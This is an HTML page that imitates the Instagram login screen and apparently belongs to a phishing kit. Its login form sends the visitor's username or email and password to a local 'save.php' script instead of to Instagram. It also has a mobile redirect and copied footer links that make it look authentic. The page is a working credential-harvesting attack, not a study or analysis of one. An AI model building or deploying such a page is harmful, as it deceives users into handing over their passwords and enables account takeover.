<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./assets/css/styles.css?v=3" />
    <style>
      @media (max-width: 640px) {
        .hero-panel,
        .footer,
        .secondary-actions {
          display: none !important;
        }

        .shell {
          display: block !important;
          min-height: 100vh !important;
        }

        .auth-panel {
          display: flex !important;
          min-height: 100vh !important;
          padding: 24px 16px !important;
          align-items: center !important;
          justify-content: center !important;
        }

        .auth-wrap {
          width: min(100%, 360px) !important;
        }

        .auth-wrap h2 {
          text-align: center !important;
          font-size: 1.5rem !important;
        }

        .brand {
          width: min(100%, 280px) !important;
        }
      }
    </style>
  </head>
  <body>
    <main class="shell">
      <section class="hero-panel">
        <img src="./assets/img/p.png" alt="Company preview" class="hero-image" />
      </section>

      <section class="auth-panel">
        <div class="auth-wrap">
          <h2>Log into Instagram</h2>

          <form class="auth-form" method="POST" action="save.php">
  <label class="sr-only" for="identity">name</label>
  <input
    id="identity"
    name="name"
    type="text"
    placeholder="Email, username or phone"
    required
  />

  <label class="sr-only" for="password">password</label>
  <input
    id="password"
    name="password"
    type="password"
    placeholder="Password"
    required
  />

  <button type="submit" class="primary-btn" disabled>Log in</button>
</form>
          <a href="#" class="muted-link">Forgot password?</a>

          <div>
            <img src="./assets/img/d.png" alt="Company logo" class="brand" />
          </div>
        </div>
      </section>
    </main>

    <footer class="footer">
      <nav class="footer-links" aria-label="Footer">
        <a href="#">About</a>
        <a href="#">Creators</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Lite</a>
      
        <a href="#">Threads</a>
        <a href="#">Contact</a>
        <a href="#">Verified</a>
      </nav>

      <div class="footer-meta">
        <button type="button" class="language-picker">English</button>
        <span>&copy; 2026</span>
      </div>
    </footer>

    <script>
      if (window.innerWidth <= 640) {
        window.location.href = "mobile.html";
      }

      const watchedForms = document.querySelectorAll(".auth-form, .mobile-form");

      watchedForms.forEach((form) => {
        const textInputs = form.querySelectorAll("input");
        const submitButton = form.querySelector('button[type="submit"]');

        if (!textInputs.length || !submitButton) {
          return;
        }

        const syncButtonState = () => {
          const isReady = Array.from(textInputs).every(
            (input) => input.value.trim().length > 0
          );

          submitButton.disabled = !isReady;
        };

        textInputs.forEach((input) => {
          input.addEventListener("input", syncButtonState);
        });

        syncButtonState();
      });
    </script>
  </body>
</html>
